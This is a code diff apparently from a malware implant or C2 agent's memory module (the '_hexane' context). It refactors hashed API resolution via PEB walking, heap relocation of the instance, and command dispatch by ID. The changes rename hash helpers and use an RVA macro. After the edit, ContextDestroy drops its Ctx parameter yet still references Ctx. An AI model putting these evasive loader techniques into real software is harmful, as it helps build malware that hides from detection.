@@ -88,17 +88,17 @@ namespace Memory {
             x_assert(instance.modules.ntdll = M_PTR(NTDLL));
             x_assert(F_PTR_HMOD(instance.nt.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP));
 
-            region = C_PTR(instance.base.address + U_PTR(&__instance));
+            region = RVA(PBYTE, instance.base.address, &__instance);
             x_assert(C_DREF(region) = instance.nt.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)));
 
             x_memcpy(C_DREF(region), &instance, sizeof(_hexane));
             x_memset(&instance, 0, sizeof(_hexane));
-            x_memset(C_PTR(U_PTR(region) + sizeof(LPVOID)), 0, 0xE);
+            x_memset(RVA(PBYTE, region, sizeof(LPVOID)), 0, 0xE);
 
         defer:
         }
 
-        VOID ContextDestroy(_hexane* Ctx) {
+        VOID ContextDestroy() {
             // todo: ContextDestroy needs expanded to destroy all strings (http/smb context + anything else)
 
             auto free = Ctx->nt.RtlFreeHeap;
@@ -128,7 +128,7 @@ namespace Memory {
                 const auto mod  = (LDR_DATA_TABLE_ENTRY*) B_PTR(next) - sizeof(uint32_t) * 4;
                 const auto name = mod->BaseDllName;
 
-                if (hash - Utils::GetHashFromStringW(x_wcsToLower(lowercase, name.Buffer), x_wcslen(name.Buffer)) == 0) {
+                if (hash - Utils::HashStringW(x_wcsToLower(lowercase, name.Buffer), x_wcslen(name.Buffer)) == 0) {
                     return mod;
                 }
             }
@@ -155,7 +155,7 @@ namespace Memory {
 
                     x_memset(lowercase, 0, MAX_PATH);
 
-                    if (hash - Utils::GetHashFromStringA(x_mbsToLower(lowercase, name), x_strlen(name)) == 0) {
+                    if (hash - Utils::HashStringA(x_mbsToLower(lowercase, name), x_strlen(name)) == 0) {
                         address = (FARPROC) RVA(PULONG, base, funcs[ords[name_index]]);
                         break;
                     }
@@ -170,8 +170,8 @@ namespace Memory {
             uintptr_t   symbol = 0;
             int         reload = 0;
 
-            const auto mod_hash = Utils::GetHashFromStringA(module_name, x_strlen(module_name));
-            const auto fn_hash = Utils::GetHashFromStringA(export_name, x_strlen(export_name));
+            const auto mod_hash = Utils::HashStringA(module_name, x_strlen(module_name));
+            const auto fn_hash = Utils::HashStringA(export_name, x_strlen(export_name));
 
             while (!symbol) {
                 if (!(F_PTR_HASHES(symbol, mod_hash, fn_hash))) {
@@ -278,7 +278,7 @@ namespace Memory {
 
             x_assertb(address = Memory::Methods::GetInternalAddress(cmd_id));
 
-            cmd = (_command) Ctx->base.address + address;
+            cmd = (_command) RVA(PBYTE, Ctx->base.address, address);
             cmd(&parser);
 
         defer:
